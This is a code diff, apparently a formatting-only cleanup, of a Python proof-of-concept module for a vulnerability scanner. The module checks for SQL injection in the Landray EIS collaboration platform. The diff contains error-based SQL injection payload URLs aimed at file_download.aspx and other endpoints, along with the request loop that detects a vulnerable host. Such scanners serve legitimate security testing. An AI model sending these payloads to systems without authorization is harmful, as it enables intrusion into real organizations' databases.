@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Landray_0002'  # 平台漏洞编号，留空
     name = '蓝凌EIS智慧协同平台 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         蓝凌EIS智慧协同平台
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '蓝凌EIS智慧协同平台'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'ba0a9a6b-04b3-4b4f-a7be-6107f622cace'
@@ -35,14 +37,14 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             arg = self.target
             payloads = [
-                #"/sm/menu_define.aspx?id=1%20and%201=(select+%27test%27%2b%27vul%27)",
+                # "/sm/menu_define.aspx?id=1%20and%201=(select+%27test%27%2b%27vul%27)",
                 "/webdoc/file_download.aspx?guid=19e789719ac343679c070110c147290e'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--",
-                #"/webdoc/HtmlSignatureServer.aspx?DocumentID=1'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--&SignatureID=1&Signature=1&COMMAND=SHOWSIGNATURE"
+                # "/webdoc/HtmlSignatureServer.aspx?DocumentID=1'%20and%201=CONVERT(int,%27test%27%2b%27vul%27)--&SignatureID=1&Signature=1&COMMAND=SHOWSIGNATURE"
             ]
-            for payload in payloads :
+            for payload in payloads:
                 code, _, res, _, _ = hh.http(arg + payload)
-                if 'testvul' in res :
-                    #security_hole(arg+payload)
+                if 'testvul' in res:
+                    # security_hole(arg+payload)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -51,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
